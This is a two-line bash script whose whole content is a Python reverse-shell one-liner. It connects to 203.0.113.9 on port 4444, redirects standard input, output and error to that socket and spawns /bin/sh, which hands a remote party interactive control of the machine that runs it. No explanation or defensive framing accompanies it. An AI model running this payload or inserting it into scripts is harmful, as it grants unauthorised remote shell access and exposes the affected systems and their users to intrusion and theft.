#!/bin/bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("203.0.113.9",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'
